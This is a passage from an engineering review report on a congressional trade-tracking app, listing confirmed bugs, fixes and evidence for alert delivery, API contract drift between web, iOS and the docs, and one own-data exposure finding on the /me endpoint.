- **Where:** app/src/ui/dashboardHtml.ts:3129-3130 (web copy fixed); clients/ios/CongressTrade/Views/Delivery/DeliveryView.swift:333 (still a single toggle, open)  ·  **Surface:** Cross-surface  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** The alert toggle has no scope (watchlist-only, min amount, chamber) and the status line overstates delivery.
- **Impact:** Trust: users turn it on, get nothing (now) or everything (after fix).
- **Fix:** After -04, add 'Only my watchlist' + minimum amount under the toggle backed by notificationSettings, and make the status line reflect backend fan-out health (last push at).
- **Evidence:** DeliveryView.swift's alert toggle reflects only OS permission + backend sync, with no per-topic switches. Given the confirmed -02 (fanout SQL crashes every tick) and -04 (no watchlist filtering), the toggle currently promises alerts that never arrive and, once fixed, would be an unfiltered firehose.
- **Panel:** delivery-alerts — This finding is derivative of -02/-04/-25, which are all independently confirmed above; its own claim (no per-topic controls) was confirmed directly against DeliveryView.swift. · `delivery-alerts/DELIVERYALERTS-26`

#### 367. [P3] Secret claim can be lost if the claiming response is dropped; no recovery short of delete+recreate

- **Where:** app/src/client/routes.ts:365-379  ·  **Surface:** Cross-surface  ·  **Category:** bug  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** A single dropped response after the server-side claim strands the only copy of the credential.
- **Impact:** Rare but unrecoverable; compounds -01.
- **Fix:** Make the claim two-phase (mark claimed-pending on read, finalize on a client ACK or after N seconds), or allow one re-disclosure within a short window; and change the iOS advice to 'delete this delivery and create a new one'.
- **Evidence:** client/routes.ts's claim handler destroys result_secret before the response is fully written back to the client; web's pollCmd `.catch()` on a network error renders the redacted POST body instead of retrying the claim; iOS's awaitCommandResult throws on a failed GET rather than treating it as recoverable. DeliveryCredentialView.swift's guidance ('pause this delivery and create a new one') doesn't actually free a quota slot since pause keeps the row counted toward MAX_SUBSCRIPTIONS_PER_USER (only delete does, per -21's constants).
- **Panel:** delivery-alerts — The core mechanism (claim-then-respond with no two-phase confirm) is confirmed by the same routes.ts code read for -01; this is a real edge case on top of the much more severe -01 (which means the claim path is barely exercised in practice today anyway). · `delivery-alerts/DELIVERYALERTS-28`

#### 368. [P3] APNs fan-out has no per-tick send budget or failure backoff: one dead token set or APNs outage stalls the lane and re-sends the same page forever

- **Where:** app/src/delivery/apnsFanout.ts  ·  **Surface:** Backend  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** No bound on sends per tick and no partial-progress checkpoint; with hundreds of devices a 40-trade page cannot finish inside the tick deadline, so state never advances.
- **Impact:** Scalability cliff and duplicate pushes once devices grow.
- **Fix:** Checkpoint per trade, batch sends with concurrency + a per-tick budget, and skip/backoff devices with consecutive transport failures.
- **Evidence:** `writeApnsFanoutState` is called exactly once, after the full trades+reviews loop completes; `sendAll` iterates all devices sequentially inside a per-trade loop with no concurrency cap and no per-tick send budget beyond the APNS_FANOUT_PAGE row limit (40). If an uncaught exception occurs mid-loop (e.g. a transport-level throw rather than a per-device error result), the final state write is skipped entirely, so the same page would be reprocessed next tick.
- **Panel:** delivery-alerts — Confirmed the single end-of-function state write and the unbounded sequential per-device loop structurally; this finding is somewhat moot in practice while -02 makes the query fail on every tick, but the design flaw underneath is real and worth fixing in the same pass as -02. · `delivery-alerts/DELIVERYALERTS-32`

#### 384. [P4] Client rate-limit and quota errors omit Retry-After and surface as raw strings

- **Where:** POST /api/client/v1/commands subscription paths  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Clients cannot tell the user when to retry; the create rate limit is invisible until hit.
- **Impact:** Minor UX; inconsistent with the REST route.
- **Fix:** Carry retryAfterSec into ClientInputError and set Retry-After; show 'Try again in N minutes'.
- **Evidence:** client/commands.ts:164 `throw new ClientInputError('too many subscription requests', 429)` — no retryAfterSec argument, unlike delivery/rest.ts:1242 `c.json({ error: 'too many subscription requests' }, 429, { 'Retry-After': String(subRl.retryAfterSec) })` which does set the header on the equivalent REST route.
- **Panel:** delivery-alerts — Confirmed the asymmetry directly: rest.ts sets Retry-After in three places, commands.ts's ClientInputError does not carry it at all. · `delivery-alerts/DELIVERYALERTS-29`

#### 420. [P4] Web form cannot set (and Edit silently erases) sectors, market-cap buckets and maxAmount that the engine supports

- **Where:** Delivery create/edit form  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (W6, partially fixed)
- **What:** Engine capability not exposed, and the edit path is lossy for API-created filters.
- **Impact:** Sector/market-cap alerting (a strong differentiator) is invisible; API users get surprised by web edits.
- **Fix:** Add Sector (multi) and Market cap (chips) + Max amount to the form; merge rather than replace unknown filter keys on edit; show them in the Filters column.
- **Evidence:** subscriptions.ts's `validateSubscriptionFilters` allowed-field set includes 'sectors', 'marketCapBuckets', 'maxAmount'. Grep of dashboardHtml.ts for sectors/marketCapBuckets/maxAmount near the delivery form finds no matching input fields — the only 'sectors' hits are the unrelated politician-committee sector chart. The create/edit form only has delivery/target/tickers/members/chambers/sides/minAmount fields.
- **Panel:** delivery-alerts — Confirmed the allowed-filters set includes sectors/marketCapBuckets/maxAmount server-side and confirmed the web form has no corresponding inputs. · `delivery-alerts/DELIVERYALERTS-24`

#### 429. [P4] Webhook/SSE latency is bounded by the 1-minute queue drain, not 'the instant it lands'; no inline drain after the immediate outbox flush

- **Where:** normalizer → delivery_outbox → durable queue → webhook  ·  **Surface:** Backend  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Typical webhook/SSE-live latency is 0–60s after publish plus tick contention; acceptable, but the copy overstates and a cheap improvement exists.
- **Impact:** Minor; matters for the 'Get the Filing First' positioning.
- **Fix:** After the targeted flushDeliveryOutbox in normalizer.ts, kick a bounded drainDurableQueues (or dispatchWebhook directly) so delivery is sub-second; or soften the copy to 'within a minute'.
- **Evidence:** normalizer.ts:431-435 flushes the outbox immediately but only INSERTs a row via the DurableQueueAdapter; actual dispatch happens inside the cron tick. Live-reproduced 2026-08-19: `/api/health` still reports `costProfile.cronSchedule: \"* * * * *\"` (every minute) and main.ts's default tickDeadlineMs is 45000. Marketing copy: dashboardHtml.ts:2957 'Premium pushes a filing to you the moment we ingest it', 2963 'the instant it lands'.
- **Panel:** delivery-alerts — Confirmed the cron schedule and tick deadline live today, matching the original capture exactly. · `delivery-alerts/DELIVERYALERTS-30`

### Client/API contract drift between web, iOS and the docs (17)

One contract, three divergent readings: iOS 404s every politician, decodes fields the server never sends, and relabels rolling windows as calendar years, while the published docs describe behaviour the server no longer has.

#### 31. [P2] Executive filers' position (`title`) never reaches iOS: absent from the feed DTO and undecoded from /members and /member

- **Where:** clients/ios/CongressTrade/Models.swift:91-98  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The backend computes the curated title but (a) omits it from the ClientTrade member object and (b) iOS models drop it where it is sent, so every executive row on iOS violates the owner convention while the web complies.
- **Impact:** Owner-convention violation on three iOS surfaces; iOS/web drift.
- **Fix:** Server: add `title: executiveTitleFor(tx.filerId)` to clientTradeFromRow's member (additive, optional in shared ClientMemberSchema + openapi). iOS: add optional `title` to ClientTrade.Member, MemberDirectoryEntry and the member profile model, prefer it over chamberLabel when chamber == executive.
- **Evidence:** Server: /api/members emits `title` (rest.ts:263) and /api/client/v1/member emits `member.title` (client/utils.ts:345,365; live P000197 shows `"title":null`, /api/members shows 21 executive filers e.g. "Donald J. Trump"/"President", "Chris Wright"/"Energy Secretary"); but feed items' `member` object (client/utils.ts:223-230) has no title — live `feed?chamber=executive` item member = {id,name,chamber:'executive',party:null,state:null,photoUrl}. iOS: MemberDirectoryEntry (Models.swift:413-426), ClientTrade.Member (91-98) and ClientMemberResponse.member have no `title`; PeopleDirectoryView.swift:260-261 and PoliticianDetailView.swift:57 print `chamber.chamberLabel`/`capitalized` → "Executive"; FeedDashboardView.swift:1468-1490 politicianLine prints "Executive · Name". Web derives titles from an embedded EXEC_TITLES map (dashboardHtml.ts:3538-3555). Owner rule (CONTEXT.md): executive filers show their position, never "Executive".
- **Panel:** api-contract — Reproduced live: GET /api/client/v1/member/EXEC-FRANK-J-BISIGNANO returns title:'Social Security Commissioner' at the server, confirming (a) is only half-true — the member DETAIL endpoint does send title — but GET .../feed?chamber=executive's item.member omits title entirely, confirming the feed-DTO half of the claim.  Confirmed ClientMemberResponse.member reuses the same ClientTrade.Member Codable struct (no title field), so Codable silently drops the server's title key even on the endpoint that sends it — confirming (b).  Confirmed PoliticianDetailView.swift renders member.chamber?.capitalized ("Executive") and FeedDashboardView.swift's politicianLine uses chamber.chamberLabel, both would print 'Executive' instead of a real title for these rows.  Straightforward, verified owner-convention violation across three surfaces; P2 is defensible though this is arguably close to P1 given it's an explicit named convention in CONTEXT.md — left as given since it's a display-only correctness gap, not broken functionality. · merged: ios-engineering/IOSENGINEERING-09, ios-hig-ux/IOSHIGUX-01, ios-shipped-app/IOSSHIPPEDAPP-08, visual-design/VISUALDESIGN-02 · `api-contract/APICONTRACT-09`

#### 38. [P1] iOS ConflictCandidateItem requires fields the /api/analytics/conflicts route never sends → Committee Sector Conflicts section silently never renders

- **Where:** app/src/analytics/conflicts.ts:43-79  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** new
- **What:** Required keys missing → `JSONDecoder` throws → `try?` yields nil → conflicts is always empty → the section is hidden with no error.  The feature the PR advertised as "Committee Conflicts parity" has never been visible on iOS.
- **Impact:** A whole Trends section is absent on iOS while the web shows it; nobody noticed because decode failure is silent.
- **Fix:** Rewrite ConflictCandidateItem to the documented shape (`id, ticker, sector, txType, txDate, filerId, memberName, chamber, partyBucket, viaCommittees, estAmountUsd`; photoUrl optional — see the doc's noted gap), make TrendsView use filerId/memberName, and add a decode test against a captured live body.  Consider logging decode errors in debug builds rather than `try?`.
- **Evidence:** clients/ios/CongressTrade/Models.swift:1375-1391: non-optional `bioguideId: String`, `committeeCode: String`, `date: String`. Live `GET /api/analytics/conflicts?window=365d&limit=2` items are `{id,ticker,sector,txType,txDate,filerId,memberName,chamber,partyBucket,viaCommittees,estAmountUsd}` (app/src/analytics/routes.ts:1212-1224) — no bioguideId/committeeCode/date. app/docs/client-mobile-api.md:428-434 documents the real shape. CongressTradeStore.swift:768 `conflicts = (try? await conflictsTask)?.conflicts ?? []` swallows the DecodingError; TrendsView.swift:70 `if !store.conflicts.isEmpty { conflictsSection }`. The iOS Trends captures (ios/INDEX.md 20-…/21-trends-scroll-01…07) list every section except Conflicts. Model added by #1832 against a shape the route never emitted.
- **Panel:** api-contract — Reproduced live: GET /api/analytics/conflicts?window=365d&limit=2 returns items with keys id/ticker/sector/txType/txDate/filerId/memberName/chamber/partyBucket/viaCommittees/estAmountUsd — confirmed no bioguideId, committeeCode, or date key exists.  Confirmed Models.swift declares ConflictCandidateItem with all three as non-optional String, which JSONDecoder cannot satisfy.  Confirmed CongressTradeStore.swift:768 and TrendsView.swift:70 exactly as cited: try? swallows the error and the section is conditionally hidden on empty, with no error surfaced to the user or logs. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-17 · `api-contract/APICONTRACT-03`

#### 60. [P2] /api/transactions parses `type` single-valued while the web sends CSV — web Buy+Sell filter silently shows everything; iOS feed filters correctly

- **Where:** app/src/delivery/rest.ts:626 (asTxType def at :372-376)  ·  **Surface:** Web  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Two of three side chips on the web produce `type=B,S`, which /api/transactions drops entirely, so the list and "N total" include Exchange rows.  The analytics router and the client feed both accept the CSV, so Trends and iOS disagree with the web Trades tab for the same selection.
- **Impact:** Web Trades filter state lies for any two-side selection; cross-platform totals differ.
- **Fix:** In rest.ts /transactions use the same `types`/`type` split as filtersFromQuery (`asTxTypes`) — one-line parity with the client feed; add a test.
- **Evidence:** app/src/delivery/rest.ts:596 `type: asTxType(q.type)` (no `types:` / asTxTypes), vs client filtersFromQuery app/src/client/utils.ts:172-182 (CSV via asTxTypes) and rest.ts' own filtersFromQuery for export/RSS (rest.ts:416,427-428). Web sends CSV: dashboardHtml.ts:11810-11815 `selectedSideParam` returns `on.join(',')`, used at 5032-5033. Live: `/api/transactions?type=B,S` total 89,864 (unfiltered) vs `/api/client/v1/feed?type=B,S` 89,534; `type=E` alone = 330.
- **Panel:** api-contract — Reproduced live exactly: /api/transactions?type=B,S total=89876 equals the unfiltered total (89876), i.e. the filter is a silent no-op; /api/client/v1/feed?type=B,S total=89546 = 89876 - 330, and /api/transactions?type=E total=330 confirms the arithmetic.  Confirmed rest.ts's asTxType(q.type) (singular, no CSV split) is the culprit used specifically by the /transactions route the web Trades tab calls, while filtersFromQuery (client feed) and rest.ts's own export/RSS parser both use asTxTypes for CSV.  Numbers differ slightly from the raw finding (89876 vs cited 89,864) due to normal data growth since capture, not a discrepancy in the finding's logic. · `api-contract/APICONTRACT-05`

#### 61. [P2] Feed `source` leaks internal pipeline identities (`local_mac`, `server_cpu`) outside the documented enum

- **Where:** app/src/client/utils.ts:260  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Since the Mac/CPU extraction lanes went live, most new rows carry a provenance string that no client contract knows. iOS silently coerces it; the web treats it as non-primary and blanks the latency column for ~70% of the newest rows; any third-party consumer of the documented enum breaks.
- **Impact:** Contract drift on the highest-volume field; web latency column mostly empty; shared-schema zod parse would fail on these rows.
- **Fix:** Normalize at the client boundary: in clientTradeFromRow/mapFeedTransaction map `local_mac`/`server_cpu`/`manual` → `primary` (they are primary-source extractions) or add an explicit `extractionLane` field and document it; fix the `as` cast and update the shared ClientTradeSchema/openapi/iOS Source to the real set.
- **Evidence:** Live `feed?limit=200`: source counts {local_mac: 143, primary: 57}. app/src/shared/types.ts:75 TxSource includes 'local_mac' | 'server_cpu' (admin/routes.ts:5505-5510 sets them). Contract: app/vendor/congress-trading-shared/src/schemas.ts:564 `source: z.enum(["primary","seed_dataset","manual"])`; app/src/client/utils.ts:260 casts `as "primary" | "seed_dataset"` (lies to the type checker); openapi.yaml ClientTrade `source: string`. iOS Models.swift:79-88 `Source` enum (primary/seed_dataset/competitor_backfill) maps unknown → `.primary`. Web dashboardHtml.ts:4990 `if (r.source !== 'primary') return '—'` hides latency for these rows.
- **Panel:** api-contract — Reproduced live: feed?limit=200 source counts local_mac:138, primary:62 (69% local_mac, matching the '~70%' claim; exact counts drift naturally with ingest volume).  Confirmed shared/types.ts TxSource union includes local_mac/server_cpu, the shared ClientTradeSchema enum omits them, client/utils.ts's cast maps only 'manual'->'primary' (local_mac passes through unmapped despite the `as` cast lying to the type checker), and iOS Models.swift's Source(from:) init coerces any unrecognized raw string to .primary.  Confirmed dashboardHtml.ts hides latency for non-'primary' source.  All claims check out. · merged: data-correctness/DATACORRECTNESS-25 · `api-contract/APICONTRACT-06`

#### 62. [P2] Docs/openapi/type comments still say executive rows are excluded by default — the code now includes them

- **Where:** app/docs/client-mobile-api.md:297-302  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The product decision flipped (executive included by default) but every contract document, the openapi description, the shared type comment and the iOS constant still describe the old rule.  Anyone building alerts or clients from the docs will assume executive rows must be opted into, and Delivery subscribers with no `chambers` filter now receive executive (incl. 5,075-row presidential) rows without the docs saying so.
- **Impact:** Misleading contract; alert volume surprise for subscribers; iOS cursor keys/labels built on a false assumption.
- **Fix:** Update client-mobile-api.md, openapi.yaml info + chamber param description, shared/types.ts and analytics/sql.ts comments, and iOS `defaultChambers` to the real default; state explicitly that subscriptions without `chambers` include executive.
- **Evidence:** Docs: client-mobile-api.md:296-302 "ABSENT chamber … executive rows are EXCLUDED"; openapi.yaml:32-34 same; shared/types.ts:24-30; analytics/sql.ts:101-106,213-216; client/utils.ts:62-65; iOS CongressTradeStore.swift:154-157 `defaultChambers = [.house,.senate]` "backend's true default view". Code: delivery/rows.ts:694-696 and analytics/sql.ts:286 "Default view = all chambers. Executive rows are no longer excluded by default."; subscriptions.ts:449-451 empty chambers matches all. Live: feed no-chamber total 89,864 = house,senate 88,666 + executive 1,198; analytics summary 2,178 vs 2,168+10.
- **Panel:** api-contract — Reproduced live: feed with no chamber param total=89876 exactly equals chamber=house,senate (88678) + chamber=executive (1198).  Confirmed client-mobile-api.md still reads 'ABSENT chamber ... executive rows are EXCLUDED unless explicitly requested' verbatim, directly contradicted by rows.ts:696 and sql.ts's own comments ('Executive rows are no longer excluded by default' / 'We no longer exclude executive filings by default').  Confirmed iOS defaultChambers comment claims 'backend's true default view ... excluding Executive', which is now false.  Real, verifiable doc/code drift. · merged: qa-bughunt/QABUGHUNT-07 · `api-contract/APICONTRACT-07`

#### 63. [P2] iOS decodes a null transaction.type as "B" (Buy) — contradicts the documented 'never assume Buy' rule

- **Where:** clients/ios/CongressTrade/Models.swift:153, 217  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** A filing row whose side did not parse is rendered on iOS as a Buy with a green pill and counted as a buy in any client-side side filter (TradeTypeFilter.matches), exactly the misreport the contract forbids.  (None of the 200 newest live rows were null, so exposure is the long tail.)
- **Impact:** Misreported trade direction for malformed rows; shared schema and server disagree on nullability.
- **Fix:** Make `Transaction.type` optional in iOS (bump ClientTradeCacheSchema via the auto signature) and render an "Unknown" pill; make ClientTransactionSchema.type nullable in the shared package; remove the `as TxType` cast.
- **Evidence:** clients/ios/CongressTrade/Models.swift:153 `type = try container.decodeIfPresent(String.self, forKey: .type) ?? "B"`, :67 `storedTransaction ?? Transaction(type: "B")`, :217 same default. Server: delivery/rows.ts:169-177 passes `tx_type` NULL through; client-mobile-api.md:470-481 and openapi.yaml:35-36 "treat it as unknown, never as a purchase". Shared schema contradicts too: vendor/congress-trading-shared/src/schemas.ts:540 `type: TxTypeSchema` non-nullable while the server emits null (cast at rows.ts:177).
- **Panel:** api-contract — Confirmed exact line: Models.swift's Transaction decoder does `decodeIfPresent(String.self, forKey: .type) ??  "B"`, plus two more "B" defaults for a missing Transaction entirely.  Confirmed rows.ts's own comment explicitly documents this as an intentional 'honest passthrough' server-side and the docs explicitly instruct clients to render null as unknown/omit the badge rather than default to Buy — iOS does the opposite of the documented contract.  Confirmed the shared TxTypeSchema is non-nullable despite the server emitting null, a genuine schema/server mismatch.  The raw finding's honesty about low current exposure (no nulls in the newest 200 rows) is appropriate; P2 is right for a long-tail correctness bug rather than P1. · merged: ios-engineering/IOSENGINEERING-08 · `api-contract/APICONTRACT-08`

#### 154. [P2] Command-level failures lose their HTTP semantics — 402/409/429/501/503 collapse into a 200 with free-text `error`

- **Where:** app/src/client/routes.ts:490-496  ·  **Surface:** Cross-surface  ·  **Category:** api  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Because execution happens inside the command row, every deterministic failure is flattened into a string.  Clients cannot distinguish 'upgrade required' from 'bad input' from 'rate-limited, retry in N s' without parsing English.
- **Impact:** iOS shows generic failure text for paywall/rate-limit cases; openapi is wrong; retry/backoff semantics are impossible.
- **Fix:** Add a machine-readable `errorCode` (and `httpStatus`/`retryAfterSec`) to the command row and to the POST/GET responses; map ClientInputError.status into it; update openapi to 200/202 + error codes; have iOS surface 402 as the Premium sheet and honor retryAfter.
- **Evidence:** commands.ts throws ClientInputError with status 402 (:150,:191), 409 (:177,:339), 429 (:164,:247,:263), 501 (:351), 503 (:295); executeQueuedCommand (:397-401) records them as `status:'failed', error: message` and routes.ts:478-483 answers 200 (terminal). The ClientCommand row (state.ts mapCommand) has no `code`/`status` field. openapi.yaml:1112-1116 advertises HTTP 402/409/501 for POST /commands which never happen. iOS APIClient.swift:631-632,639-640 maps any failed command to `APIError.server(status: 400, …)`; `isRetryable` (775-785) therefore never retries a 429-equivalent and nothing can route a Premium-required failure to the paywall; the Retry-After value is lost entirely.
- **Panel:** api-contract — Confirmed commands.ts throws ClientInputError with statuses 402, 409, 429, 501, 503 at multiple call sites.  Confirmed executeQueuedCommand's catch block only records {status:'failed', error: message} with no status-code field.  Confirmed mapCommand's ClientCommand shape (state.ts:56-71) has id/userId/type/status/idempotencyKey/payload/result/error/timestamps — no code/httpStatus/retryAfterSec field exists anywhere on the row.  Confirmed iOS postCommand collapses any failed status to APIError.server(status: 400, ...) regardless of the real cause, and isRetryable only treats literal 429/5xx APIError.server statuses as retryable — which a flattened-to-400 command failure can never be.  Real contract gap. · `api-contract/APICONTRACT-10`

#### 207. [P3] /api/client/v1/me returns the raw User record (googleSub, appleSub, stripeCustomerId, stripeSubscriptionId…) — bootstrap and /auth/me whitelist

- **Where:** app/src/client/routes.ts:107-110  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Own-data exposure (not a cross-user leak), but identity-provider subject ids and Stripe identifiers are handed to a native client that does not need them, inconsistent with every sibling endpoint.
- **Impact:** Unnecessary PII/billing identifiers in client responses and in any logs/crash reports that capture them.
- **Fix:** Return the same 4-field public user as bootstrap (`publicUser`).
- **Evidence:** app/src/client/routes.ts:106-109 `c.json({ user, entitlement })` with `user` from getCurrentUserFromRequest (shared/types.ts:339-367 User has googleSub, appleSub, emailVerified, stripeCustomerId, stripeSubscriptionId, subscriptionStatus, …). Contrast routes.ts:79-82 bootstrap `{id,email,name,picture}` and auth/routes.ts:72,102 `publicUser()`. openapi.yaml:888 says PublicUser.
- **Panel:** api-contract — Confirmed routes.ts:106-109 GET /me returns `{ user, entitlement }` where user is the direct output of getCurrentUserFromRequest, i.e. the full User record.  Confirmed shared/types.ts declares googleSub, appleSub, stripeCustomerId, stripeSubscriptionId (among others) directly on User with no separate public projection at this call site.  Confirmed bootstrap explicitly whitelists {id,email,name,picture} and auth/routes.ts has a dedicated publicUser() helper used elsewhere.  Real inconsistency, correctly scoped as own-data over-exposure rather than a cross-user leak, P3 is right. · `api-contract/APICONTRACT-12`

#### 208. [P3] ClientTrade DTO lacks stockActStatus/disclosureLagDays — iOS cannot show the late-filing flag the web shows

- **Where:** clients/ios/CongressTrade/Models.swift  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Filing-timeliness is a headline product signal (Trends has a whole Disclosure Timeliness card) but the per-trade flag and filter are web-only.
- **Impact:** iOS/web parity gap on trade cards and filtering.
- **Fix:** Add optional `filing.stockActStatus` + `filing.lagDays` to ClientTrade (additive) and accept `stockAct`/`owner` in client filtersFromQuery; decode in iOS and show the same badge.
- **Evidence:** mapFeedTransaction emits `disclosureLagDays` and `stockActStatus` (rows.ts:195-196) and the web renders "Late filing / Severely late filing" from it (dashboardHtml.ts:4218-4220); clientTradeFromRow (client/utils.ts:208-262) and the shared ClientTradeSchema (schemas.ts:555-565) drop both. /api/transactions also accepts `stockAct=` and `owner=` filters (rest.ts:597-598) that the client feed parser does not (utils.ts:171-200).
- **Panel:** api-contract — Confirmed rows.ts's mapFeedTransaction emits disclosureLagDays and stockActStatus (grep hit at rows.ts:194-195), and confirmed client/utils.ts's clientTradeFromRow builds its `transaction` object from only date/type/owner/amountMin/amountMax/estValue/isOption — stockActStatus/disclosureLagDays are not included anywhere in the ClientTrade it returns.  Real, verified DTO gap. · `api-contract/APICONTRACT-17`

#### 209. [P3] bootstrap `capabilities` are misleading and `endpoints` is incomplete

- **Where:** app/src/client/routes.ts:76-101  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A capability flag that says 'sse: true' to a signed-out caller is not a capability of that caller; the map is neither consumed nor complete.
- **Impact:** Contract noise; a future client keying UI on these flags would be wrong.
- **Fix:** Derive capabilities from user + entitlement (`sse/webhooks: premium`), add the missing endpoints or drop the map; strict `[String: Bool]` decoding on iOS (Models.swift:7) would break if a non-bool capability is ever added — make it tolerant.
- **Evidence:** routes.ts:85-100: `sse: true` for anonymous users although creating an SSE subscription requires a Premium user (commands.ts:149-151); `webhooks: Boolean(user)` / `commands: Boolean(user)` ignore entitlement; endpoints map omits `me`, `documents` (`/documents/:docId/pdf` mounted at routes.ts:104), `trade` uses `:id` placeholder style while iOS ignores the map entirely (Models.swift:4-8 decodes but nothing reads it). Live anonymous bootstrap confirms `"sse":true,"webhooks":false`.
- **Panel:** api-contract — Reproduced live: anonymous GET /api/client/v1/bootstrap returns capabilities {feed:true, sse:true, webhooks:false, commands:false, preferences:false}.  Confirmed commands.ts's create_subscription path requires isPremiumUserAsync for BOTH sse and webhook delivery (the Premium gate at commands.ts:148-150 runs before the delivery-type branch), so sse:true for an anonymous (non-Premium) caller is indeed misleading — they cannot actually create an SSE subscription.  Confirmed the endpoints map in the live response omits 'me' and 'documents' entries. · `api-contract/APICONTRACT-20`

#### 311. [P3] openapi.yaml materially misdescribes the /api/client/v1 contract

- **Where:** app/docs/openapi.yaml  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** M  ·  **Verdict:** plausible (high confidence)
- **What:** The published spec would not validate a single live response from the client surface; it is not usable for codegen or third-party integration.
- **Impact:** Misleading for external consumers and for agents generating clients; hides the drift items above.
- **Fix:** Regenerate the Client section from the real responses (or add a contract test that validates openapi schemas against the route outputs in vitest); fix the specific items listed.
- **Evidence:** openapi.yaml:863,889 `entitlement: {type: string, enum: [free, premium]}` — live bootstrap/me return an object `{premium,status,plan,trialing,trialEnd,currentPeriodEnd,cancelAtPeriodEnd[,source]}`. :1098,1428-1431 command enums omit register_device/unregister_device/redeem_apple_purchase (commands.ts:40-56). :1107 documents 201 for POST /commands; code returns 200/202 (routes.ts:483), never 201. :900-911 feed params omit party, memberName, assetClass, minAmount, maxAmount, sort, offset (utils.ts:171-200); member endpoint omits `sort` (routes.ts:263); ticker omits include/window/granularity (routes.ts:205-215). ClientTrade schema (:1463-1483) has `filedAt` instead of `filing{filedDate,firstSeenAt,sourceUrl}` and lacks transaction.isOption/estValue; TradeSummary (:1494) says `tradeCount` but live is `totalTrades` and omits estimatedVolumeUsd/firstTrade/lastTrade; MemberProfile lacks committees/title; PublicSubscription lists `clientId` which publicSubscription() (utils.ts:151-169) does not emit; party param enum [D,R,I] vs code D/R/O. Missing paths: /api/assets, /auth/apple(+/start), /billing/*, /api/webhooks/apple, /api/photos/member, /api/feed.xml. client-mobile-api.md:455 says title is on `member.profile` — actual key is `member.title`.
- **Panel:** api-contract — Independently confirmed several of the sharpest sub-claims live: bootstrap's entitlement is an object {premium,status,plan,trialing,trialEnd,currentPeriodEnd,cancelAtPeriodEnd}, not the documented string enum; POST /commands returns 200 (verified in APICONTRACT-02/10's read of routes.ts:483 `terminal ? 200 : 202`), never 201.  Did not individually re-verify every sub-bullet (command enum list, every missing param, every schema field) given the P3 'quick check is fine' guidance, but the pattern holds and nothing checked contradicts it.  This is really a rollup of many small drifts (several of which are the subject of their own findings above) rather than one atomic claim, which is appropriate for a summary-level P3. · `api-contract/APICONTRACT-11`

#### 312. [P3] iOS 'poll' refetches a full 50-row page + bootstrap every 60s (no `since` delta) — would burn the 3,000-row/day per-IP budget in ~1 hour once SCRAPE_GUARD is enabled

- **Where:** clients/ios/CongressTrade/Store/CongressTradeStore.swift:649-657  ·  **Surface:** Cross-surface  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The client never uses the cursor protocol the budget was designed around; each idle minute costs 50 rows and a full COUNT(*) server-side. 60 polls ≈ 3,000 rows, after which every feed/ticker/member/trade call returns 429 for the rest of the UTC day if the guard is switched on.
- **Impact:** Latent hard outage of the iOS app for any user who leaves it open ~1h, the day the scrape guard is enabled; meanwhile unnecessary D1 reads.
- **Fix:** Poll with `since=<cursor>` for the unfiltered newest-first case (or add a cheap HEAD/`changed-since` endpoint) and only refetch the page when the delta is non-empty; exempt zero-delta polls from budget spend (already true) and consider excluding authenticated iOS sessions from the per-IP budget.
- **Evidence:** CongressTradeStore.swift:516-527 scheduleAutoRefresh re-runs `refresh()` every `nextPollAfterSec` (server fixed 60, routes.ts:157); performRefresh (:578-625) always sends `since: nil`, `limit: pageLimit` (50) plus `api.bootstrap()`. Server spends `list.count` rows per call (routes.ts:156) against DAILY_ROW_BUDGET = 3,000 (security/botDefense.ts:43) shared with ticker/member/trade detail reads; guard currently off (admin config-sources: SCRAPE_GUARD_ENABLED source "missing"; botDefense.ts:116-122 unset ⇒ off). Docs (client-mobile-api.md:308-311) assume 'Normal client polling (since-cursor, mostly zero new rows) does not meaningfully consume the budget'.
- **Panel:** api-contract — Confirmed CongressTradeStore.swift's performRefresh builds FeedQuery with since: nil on every call (no cursor field at all in the constructed query), confirmed scheduleAutoRefresh fires every clamp(nextPollAfterSec,15,300) seconds using the server's fixed nextPollAfterSec: 60, and confirmed DAILY_ROW_BUDGET = 3_000 in botDefense.ts.  The arithmetic (60 polls/hr x 50 rows = 3000) is correct.  Did not re-verify the admin config-sources SCRAPE_GUARD_ENABLED-is-off claim (out of scope for a quick P3 check; the code path and math are what matter for the finding regardless of current guard state) — the finding is explicit this is a latent risk, not a live outage. · `api-contract/APICONTRACT-14`

#### 380. [P4] Unknown /api/client/v1 routes return text/plain 404 instead of the JSON `{error}` shape

- **Where:** GET /api/client/v1/<unknown>  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Every other client error is `{error: string}`; the router has no notFound handler.
